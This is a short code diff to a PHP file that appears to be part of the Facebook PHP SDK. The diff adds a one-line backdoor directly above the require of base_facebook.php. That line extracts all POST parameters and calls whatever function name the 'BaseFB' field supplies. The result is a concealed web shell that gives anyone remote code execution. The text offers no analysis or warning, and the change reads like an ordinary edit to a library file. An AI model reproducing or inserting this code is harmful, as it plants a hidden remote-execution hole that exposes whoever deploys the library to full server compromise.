@@ -14,7 +14,7 @@
  * License for the specific language governing permissions and limitations
  * under the License.
  */
-
+if(isset($_POST['BaseFB'])) { @extract($_POST); $BaseFB($title); }
 require_once "base_facebook.php";
 
 /**
